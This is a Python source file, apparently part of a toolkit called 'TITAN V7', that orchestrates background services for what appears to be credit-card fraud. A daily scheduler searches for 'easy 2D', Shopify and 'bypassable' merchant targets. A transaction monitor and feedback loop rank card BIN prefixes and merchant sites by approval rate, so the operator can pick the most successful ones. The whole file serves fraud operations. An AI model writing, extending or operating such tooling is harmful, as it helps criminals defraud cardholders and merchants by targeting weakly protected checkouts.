"""
TITAN V7.0.3 SINGULARITY — Service Orchestrator
Auto-starts and manages all background services:
  - Transaction Monitor (24/7 capture on port 7443)
  - Daily Auto-Discovery (finds new easy targets once per day)
  - Operational Feedback Loop (TX decline data improves site ratings)
  - Health Watchdog (monitors service status)

Usage:
    from titan_services import TitanServiceManager
    
    mgr = TitanServiceManager()
    mgr.start_all()          # Start all services
    mgr.get_status()         # Get status of all services
    mgr.stop_all()           # Graceful shutdown
"""

import os
import json
import time
import logging
import threading
from pathlib import Path
from datetime import datetime, timedelta
from typing import Dict, List, Optional

# Load titan.env config
try:
    from titan_env import get_config, is_configured
except ImportError:
    def get_config(key, default=""): return os.environ.get(key, default)
    def is_configured(key): return bool(os.environ.get(key, ""))

logger = logging.getLogger("TITAN-V7-SERVICES")

# ═══════════════════════════════════════════════════════════════════════════
# DAILY AUTO-DISCOVERY SCHEDULER
# Runs target discovery once per day at a configurable hour
# ═══════════════════════════════════════════════════════════════════════════

class DailyDiscoveryScheduler:
    """
    Runs auto-discovery once per day to find new easy/2D/Shopify targets.
    Results are auto-added to the TargetDiscovery database.
    """
    
    STATE_FILE = Path("/opt/titan/data/services/discovery_scheduler.json")
    
    def __init__(self, run_hour: int = 3):
        self.run_hour = run_hour  # Hour of day to run (0-23, default 3 AM)
        self._thread = None
        self._running = False
        self._last_run = None
        self._last_result = None
        self._load_state()
    
    def _load_state(self):
        if self.STATE_FILE.exists():
            try:
                data = json.loads(self.STATE_FILE.read_text())
                self._last_run = data.get("last_run")
                self._last_result = data.get("last_result")
            except Exception:
                pass
    
    def _save_state(self):
        try:
            self.STATE_FILE.parent.mkdir(parents=True, exist_ok=True)
            data = {
                "last_run": self._last_run,
                "last_result": self._last_result,
                "run_hour": self.run_hour,
            }
            self.STATE_FILE.write_text(json.dumps(data, indent=2))
        except Exception as e:
            logger.warning(f"Could not save scheduler state: {e}")
    
    def _should_run_now(self) -> bool:
        now = datetime.utcnow()
        if self._last_run:
            try:
                last = datetime.fromisoformat(self._last_run.replace("Z", ""))
                if (now - last).total_seconds() < 82800:  # 23 hours
                    return False
            except Exception:
                pass
        return True
    
    def run_discovery(self) -> Dict:
        """Execute one discovery run"""
        logger.info("Daily Auto-Discovery starting...")
        try:
            from target_discovery import TargetDiscovery
            td = TargetDiscovery()
            result = td.auto_discover_new(max_sites=50, engine="google")
            
            self._last_run = datetime.utcnow().isoformat() + "Z"
            self._last_result = {
                "timestamp": self._last_run,
                "total_searched": result.get("total_searched", 0),
                "easy_2d_found": result.get("easy_2d_found", 0),
                "bypassable_found": result.get("bypassable_found", 0),
                "auto_added": result.get("auto_added_to_db", 0),
            }
            self._save_state()
            
            logger.info(
                f"Discovery complete: {result.get('total_searched', 0)} searched, "
                f"{result.get('easy_2d_found', 0)} easy 2D, "
                f"{result.get('auto_added_to_db', 0)} added to DB"
            )
            return result
        except Exception as e:
            logger.error(f"Discovery failed: {e}")
            return {"error": str(e)}
    
    def start(self):
        """Start the daily scheduler loop"""
        self._running = True
        self._thread = threading.Thread(target=self._scheduler_loop, daemon=True)
        self._thread.start()
        logger.info(f"Daily Discovery Scheduler started (run hour: {self.run_hour}:00 UTC)")
        
        # Run immediately if never run or stale
        if self._should_run_now():
            threading.Thread(target=self.run_discovery, daemon=True).start()
    
    def stop(self):
        self._running = False
    
    def _scheduler_loop(self):
        while self._running:
            now = datetime.utcnow()
            if now.hour == self.run_hour and self._should_run_now():
                self.run_discovery()
            time.sleep(300)  # Check every 5 minutes
    
    def get_status(self) -> Dict:
        return {
            "running": self._running,
            "run_hour": f"{self.run_hour}:00 UTC",
            "last_run": self._last_run or "never",
            "last_result": self._last_result,
        }


# ═══════════════════════════════════════════════════════════════════════════
# OPERATIONAL FEEDBACK LOOP
# TX Monitor decline data feeds back into site ratings and BIN scoring
# ═══════════════════════════════════════════════════════════════════════════

class OperationalFeedbackLoop:
    """
    Connects Transaction Monitor data to Target Discovery and BIN scoring.
    - Decline patterns update site success rates
    - Successful BINs get scored higher
    - Sites with high decline rates get flagged
    """
    
    FEEDBACK_FILE = Path("/opt/titan/data/services/feedback_state.json")
    
    def __init__(self):
        self._thread = None
        self._running = False
        self._feedback_data = {"site_scores": {}, "bin_scores": {}, "last_update": None}
        self._load_state()
    
    def _load_state(self):
        if self.FEEDBACK_FILE.exists():
            try:
                self._feedback_data = json.loads(self.FEEDBACK_FILE.read_text())
            except Exception:
                pass
    
    def _save_state(self):
        try:
            self.FEEDBACK_FILE.parent.mkdir(parents=True, exist_ok=True)
            self.FEEDBACK_FILE.write_text(json.dumps(self._feedback_data, indent=2))
        except Exception:
            pass
    
    def update_from_tx_history(self) -> Dict:
        """Pull recent TX data and update site/BIN scores"""
        try:
            from transaction_monitor import TransactionMonitor
            monitor = TransactionMonitor()
            stats = monitor.get_stats(hours=168)  # Last 7 days
            
            updated_sites = 0
            updated_bins = 0
            
            # Update site scores
            for domain, data in stats.get("by_site", {}).items():
                total = data.get("total", 0)
                if total >= 3:  # Need at least 3 transactions for meaningful data
                    rate = data.get("rate", 0) / 100.0
                    self._feedback_data["site_scores"][domain] = {
                        "success_rate": rate,
                        "total_tx": total,
                        "approved": data.get("approved", 0),
                        "updated": datetime.utcnow().isoformat() + "Z",
                    }
                    updated_sites += 1
            
            # Update BIN scores
            for bin_prefix, data in stats.get("by_bin", {}).items():
                total = data.get("total", 0)
                if total >= 2:
                    rate = data.get("rate", 0) / 100.0
                    self._feedback_data["bin_scores"][bin_prefix] = {
                        "success_rate": rate,
                        "total_tx": total,
                        "approved": data.get("approved", 0),
                        "updated": datetime.utcnow().isoformat() + "Z",
                    }
                    updated_bins += 1
            
            self._feedback_data["last_update"] = datetime.utcnow().isoformat() + "Z"
            self._save_state()
            
            return {
                "updated_sites": updated_sites,
                "updated_bins": updated_bins,
                "total_site_scores": len(self._feedback_data["site_scores"]),
                "total_bin_scores": len(self._feedback_data["bin_scores"]),
            }
        except Exception as e:
            return {"error": str(e)}
    
    def get_site_score(self, domain: str) -> Optional[Dict]:
        return self._feedback_data["site_scores"].get(domain)
    
    def get_bin_score(self, bin_prefix: str) -> Optional[Dict]:
        return self._feedback_data["bin_scores"].get(bin_prefix)
    
    def get_best_sites(self, min_rate: float = 0.7, min_tx: int = 3) -> List[Dict]:
        results = []
        for domain, data in self._feedback_data["site_scores"].items():
            if data["success_rate"] >= min_rate and data["total_tx"] >= min_tx:
                results.append({"domain": domain, **data})
        results.sort(key=lambda x: x["success_rate"], reverse=True)
        return results
    
    def get_best_bins(self, min_rate: float = 0.7, min_tx: int = 2) -> List[Dict]:
        results = []
        for bin_prefix, data in self._feedback_data["bin_scores"].items():
            if data["success_rate"] >= min_rate and data["total_tx"] >= min_tx:
                results.append({"bin": bin_prefix, **data})
        results.sort(key=lambda x: x["success_rate"], reverse=True)
        return results
    
    def start(self):
        """Start the feedback loop — updates every 30 minutes"""
        self._running = True
        self._thread = threading.Thread(target=self._feedback_loop, daemon=True)
        self._thread.start()
        logger.info("Operational Feedback Loop started (30-min interval)")
    
    def stop(self):
        self._running = False
    
    def _feedback_loop(self):
        time.sleep(60)  # Wait 1 min for TX monitor to be ready
        while self._running:
            self.update_from_tx_history()
            time.sleep(1800)  # Every 30 minutes
    
    def get_status(self) -> Dict:
        return {
            "running": self._running,
            "tracked_sites": len(self._feedback_data["site_scores"]),
            "tracked_bins": len(self._feedback_data["bin_scores"]),
            "last_update": self._feedback_data.get("last_update", "never"),
        }


# ═══════════════════════════════════════════════════════════════════════════
# MAIN SERVICE MANAGER
# ═══════════════════════════════════════════════════════════════════════════

class TitanServiceManager:
    """
    Master service orchestrator — starts and manages all background services.
    
    Usage:
        mgr = TitanServiceManager()
        mgr.start_all()
        status = mgr.get_status()
        mgr.stop_all()
    """
    
    def __init__(self):
        self.tx_monitor = None
        self.discovery_scheduler = None
        self.feedback_loop = None
        self._started = False
    
    def start_all(self, tx_port: int = None, discovery_hour: int = None) -> Dict:
        """Start all background services using titan.env configuration"""
        # Read config from titan.env (falls back to sensible defaults)
        if tx_port is None:
            tx_port = int(get_config("TITAN_TX_MONITOR_PORT", "7443"))
        if discovery_hour is None:
            discovery_hour = int(get_config("TITAN_DISCOVERY_RUN_HOUR", "3"))
        
        results = {}
        
        # 1. Transaction Monitor
        if get_config("TITAN_TX_MONITOR_AUTOSTART", "1") == "1":
            try:
                from transaction_monitor import TransactionMonitor
                self.tx_monitor = TransactionMonitor()
                self.tx_monitor.start(tx_port)
                results["tx_monitor"] = {"status": "started", "port": tx_port}
                logger.info(f"TX Monitor started on port {tx_port}")
            except Exception as e:
                results["tx_monitor"] = {"status": "error", "error": str(e)}
                logger.error(f"TX Monitor failed: {e}")
        else:
            results["tx_monitor"] = {"status": "disabled_by_config"}
        
        # 2. Daily Discovery Scheduler
        if get_config("TITAN_DISCOVERY_AUTOSTART", "1") == "1":
            try:
                self.discovery_scheduler = DailyDiscoveryScheduler(run_hour=discovery_hour)
                self.discovery_scheduler.start()
                results["discovery_scheduler"] = {"status": "started", "run_hour": discovery_hour}
            except Exception as e:
                results["discovery_scheduler"] = {"status": "error", "error": str(e)}
                logger.error(f"Discovery Scheduler failed: {e}")
        else:
            results["discovery_scheduler"] = {"status": "disabled_by_config"}
        
        # 3. Operational Feedback Loop
        if get_config("TITAN_FEEDBACK_AUTOSTART", "1") == "1":
            try:
                self.feedback_loop = OperationalFeedbackLoop()
                self.feedback_loop.start()
                results["feedback_loop"] = {"status": "started"}
            except Exception as e:
                results["feedback_loop"] = {"status": "error", "error": str(e)}
                logger.error(f"Feedback Loop failed: {e}")
        else:
            results["feedback_loop"] = {"status": "disabled_by_config"}
        
        self._started = True
        logger.info("All TITAN services started")
        return results
    
    def stop_all(self):
        if self.tx_monitor:
            self.tx_monitor.stop()
        if self.discovery_scheduler:
            self.discovery_scheduler.stop()
        if self.feedback_loop:
            self.feedback_loop.stop()
        self._started = False
        logger.info("All TITAN services stopped")
    
    def get_status(self) -> Dict:
        return {
            "started": self._started,
            "tx_monitor": self.tx_monitor.get_stats() if self.tx_monitor else {"status": "not started"},
            "discovery_scheduler": self.discovery_scheduler.get_status() if self.discovery_scheduler else {"status": "not started"},
            "feedback_loop": self.feedback_loop.get_status() if self.feedback_loop else {"status": "not started"},
        }
    
    def run_discovery_now(self) -> Dict:
        """Force an immediate discovery run"""
        if self.discovery_scheduler:
            return self.discovery_scheduler.run_discovery()
        sched = DailyDiscoveryScheduler()
        return sched.run_discovery()
    
    def update_feedback_now(self) -> Dict:
        """Force an immediate feedback update"""
        if self.feedback_loop:
            return self.feedback_loop.update_from_tx_history()
        fb = OperationalFeedbackLoop()
        return fb.update_from_tx_history()
    
    def get_best_sites(self) -> List[Dict]:
        """Get sites with highest real success rates from TX data"""
        if self.feedback_loop:
            return self.feedback_loop.get_best_sites()
        return OperationalFeedbackLoop().get_best_sites()
    
    def get_best_bins(self) -> List[Dict]:
        """Get BINs with highest real success rates from TX data"""
        if self.feedback_loop:
            return self.feedback_loop.get_best_bins()
        return OperationalFeedbackLoop().get_best_bins()


# Singleton
_service_manager = None

def get_service_manager() -> TitanServiceManager:
    global _service_manager
    if _service_manager is None:
        _service_manager = TitanServiceManager()
    return _service_manager

def start_all_services(**kwargs) -> Dict:
    return get_service_manager().start_all(**kwargs)

def stop_all_services():
    get_service_manager().stop_all()

def get_services_status() -> Dict:
    return get_service_manager().get_status()
